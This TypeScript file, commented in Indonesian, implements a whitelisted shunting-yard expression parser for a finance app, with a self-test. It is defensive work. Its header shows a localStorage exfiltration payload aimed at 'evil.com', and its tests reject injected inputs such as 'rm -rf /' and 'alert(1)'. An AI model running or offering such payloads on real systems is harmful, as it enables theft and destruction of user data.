// ═══════════════════════════════════════════════════════════════
// MasDeen Finance v17 — Safe Expression Parser
// 
// PROBLEM: User ingin mengetik "10 + 5.5 + 2" di kolom qty dan
//          sistem otomatis menghitung jadi 17.5.
//
// SOLUSI JELEK (JANGAN): eval("10+5.5+2") 
//   - Bisa eksekusi kode arbitrer! Kalau user (atau attacker via
//     copy-paste) mengetik `fetch('evil.com', {body: localStorage})`,
//     data user bocor.
//
// SOLUSI BAIK (INI): Shunting-yard algorithm
//   - Tokenize input jadi angka & operator saja
//   - Kalau ada karakter selain angka/operator → tolak
//   - Evaluasi hanya dengan operator matematika dasar: + - × ÷ ()
// ═══════════════════════════════════════════════════════════════

export interface ParseResult {
  ok: boolean;
  value: number;
  error?: string;
}

/**
 * Whitelist karakter yang diizinkan.
 * Hanya: digit, titik, koma, operator, kurung, spasi.
 */
const ALLOWED_CHARS = /^[\d+\-*/.,() ]+$/;

type Token = number | '+' | '-' | '*' | '/' | '(' | ')';

/**
 * Tokenizer: pecah string input jadi daftar token.
 */
function tokenize(input: string): Token[] | null {
  const tokens: Token[] = [];
  let i = 0;
  
  while (i < input.length) {
    const ch = input[i];
    
    // Skip spasi
    if (ch === ' ') { i++; continue; }
    
    // Operator & kurung
    if (ch === '+' || ch === '-' || ch === '*' || ch === '/' || ch === '(' || ch === ')') {
      tokens.push(ch as Token);
      i++;
      continue;
    }
    
    // Angka (boleh ada satu titik desimal)
    if (/[\d.]/.test(ch)) {
      let numStr = '';
      let dotCount = 0;
      while (i < input.length && /[\d.]/.test(input[i])) {
        if (input[i] === '.') {
          dotCount++;
          if (dotCount > 1) return null; // "1.2.3" invalid
        }
        numStr += input[i];
        i++;
      }
      const num = parseFloat(numStr);
      if (isNaN(num)) return null;
      tokens.push(num);
      continue;
    }
    
    // Karakter tidak dikenal
    return null;
  }
  
  return tokens;
}

/**
 * Tangani unary minus (contoh: "-5" atau "10 + -3").
 * Konversi "-X" di awal atau setelah operator/kurung-buka jadi "0 - X" secara logika.
 */
function handleUnary(tokens: Token[]): Token[] | null {
  const result: Token[] = [];
  for (let i = 0; i < tokens.length; i++) {
    const t = tokens[i];
    // Cek apakah ini unary minus
    const isUnary = 
      t === '-' && (
        i === 0 || 
        tokens[i - 1] === '+' || 
        tokens[i - 1] === '-' || 
        tokens[i - 1] === '*' || 
        tokens[i - 1] === '/' || 
        tokens[i - 1] === '('
      );
    
    if (isUnary) {
      // Lihat token berikutnya — harus angka
      const next = tokens[i + 1];
      if (typeof next !== 'number') return null;
      result.push(-next);
      i++; // skip token angka yang sudah kita konsumsi
    } else {
      result.push(t);
    }
  }
  return result;
}

/**
 * Konversi tokens infix ke Reverse Polish Notation (RPN)
 * pakai Shunting-yard algorithm.
 */
function toRPN(tokens: Token[]): Token[] | null {
  const output: Token[] = [];
  const ops: Token[] = [];
  const prec: Record<string, number> = {
    '+': 1,
    '-': 1,
    '*': 2,
    '/': 2,
  };
  
  for (const t of tokens) {
    if (typeof t === 'number') {
      output.push(t);
    } else if (t === '(') {
      ops.push(t);
    } else if (t === ')') {
      while (ops.length && ops[ops.length - 1] !== '(') {
        output.push(ops.pop()!);
      }
      if (!ops.length) return null; // kurung tutup tanpa pembuka
      ops.pop(); // buang '('
    } else {
      // Operator biner
      while (
        ops.length &&
        ops[ops.length - 1] !== '(' &&
        prec[ops[ops.length - 1] as string] >= prec[t as string]
      ) {
        output.push(ops.pop()!);
      }
      ops.push(t);
    }
  }
  
  while (ops.length) {
    const op = ops.pop()!;
    if (op === '(') return null; // kurung buka tanpa penutup
    output.push(op);
  }
  
  return output;
}

/**
 * Evaluasi RPN tokens.
 */
function evalRPN(rpn: Token[]): number | null {
  const stack: number[] = [];
  
  for (const t of rpn) {
    if (typeof t === 'number') {
      stack.push(t);
    } else {
      if (stack.length < 2) return null;
      const b = stack.pop()!;
      const a = stack.pop()!;
      let result: number;
      switch (t) {
        case '+': result = a + b; break;
        case '-': result = a - b; break;
        case '*': result = a * b; break;
        case '/': 
          if (b === 0) return null; // division by zero
          result = a / b; 
          break;
        default: return null;
      }
      if (!isFinite(result)) return null;
      stack.push(result);
    }
  }
  
  if (stack.length !== 1) return null;
  return stack[0];
}

/**
 * Main API: parse & evaluate expression.
 * 
 * CONTOH:
 *   evalExpression("10 + 5.5 + 2")     → { ok: true, value: 17.5 }
 *   evalExpression("10 + 5,5 + 2")     → { ok: true, value: 17.5 }  (koma = titik)
 *   evalExpression("(10+5)*2")         → { ok: true, value: 30 }
 *   evalExpression("10 / 0")           → { ok: false, error: "division by zero" }
 *   evalExpression("alert(1)")         → { ok: false, error: "invalid characters" }
 *   evalExpression("10 +")             → { ok: false, error: "incomplete expression" }
 */
export function evalExpression(input: string): ParseResult {
  if (!input || typeof input !== 'string') {
    return { ok: false, value: 0, error: 'empty input' };
  }
  
  // Normalisasi: koma → titik (user Indonesia sering pakai koma desimal)
  const normalized = input.trim().replace(/,/g, '.');
  
  if (!normalized) {
    return { ok: false, value: 0, error: 'empty input' };
  }
  
  // Cek karakter
  if (!ALLOWED_CHARS.test(normalized)) {
    return { ok: false, value: 0, error: 'invalid characters' };
  }
  
  // Tokenize
  let tokens = tokenize(normalized);
  if (!tokens) {
    return { ok: false, value: 0, error: 'tokenize failed' };
  }
  
  // Handle unary minus
  tokens = handleUnary(tokens);
  if (!tokens) {
    return { ok: false, value: 0, error: 'invalid unary' };
  }
  
  // Ke RPN
  const rpn = toRPN(tokens);
  if (!rpn) {
    return { ok: false, value: 0, error: 'unmatched parentheses' };
  }
  
  // Evaluasi
  const result = evalRPN(rpn);
  if (result === null) {
    return { ok: false, value: 0, error: 'evaluation failed' };
  }
  
  return { ok: true, value: result };
}

/**
 * Quick helper: parse ekspresi, fallback ke default kalau gagal.
 */
export function evalExpressionOr(input: string, fallback: number = 0): number {
  const r = evalExpression(input);
  return r.ok ? r.value : fallback;
}

/**
 * Cek apakah string mengandung operator matematika (untuk tampilan icon calculator).
 */
export function hasMathOperator(input: string): boolean {
  return /[+\-*/()]/.test(input);
}

// ───────────────────────────────────────────────────────────────
// SELF-TEST
// ───────────────────────────────────────────────────────────────

export function verifyParser(): { ok: boolean; failures: string[] } {
  const failures: string[] = [];
  
  const assertOk = (expr: string, expected: number) => {
    const r = evalExpression(expr);
    if (!r.ok) {
      failures.push(`[${expr}] expected ${expected}, got error: ${r.error}`);
    } else if (Math.abs(r.value - expected) > 1e-9) {
      failures.push(`[${expr}] expected ${expected}, got ${r.value}`);
    }
  };
  
  const assertFail = (expr: string) => {
    const r = evalExpression(expr);
    if (r.ok) {
      failures.push(`[${expr}] should fail but got ${r.value}`);
    }
  };
  
  // Basic
  assertOk('1', 1);
  assertOk('1+2', 3);
  assertOk('10 + 5.5 + 2', 17.5);
  assertOk('10 + 5,5 + 2', 17.5); // koma
  
  // Operator precedence
  assertOk('2+3*4', 14);
  assertOk('(2+3)*4', 20);
  assertOk('10/2/5', 1);
  
  // Unary minus
  assertOk('-5', -5);
  assertOk('10+-3', 7);
  assertOk('10--3', 13);
  
  // Nested parens
  assertOk('((1+2)*3)', 9);
  assertOk('(2*(3+4))', 14);
  
  // Edge cases that should fail
  assertFail('');
  assertFail('alert(1)');
  assertFail('10+');
  assertFail('10/0');
  assertFail('(10+5');
  assertFail('10+5)');
  assertFail('1.2.3');
  assertFail('abc');
  assertFail('10 + 5; rm -rf /'); // security: no extra chars
  assertFail('eval("1")');
  
  return { ok: failures.length === 0, failures };
}
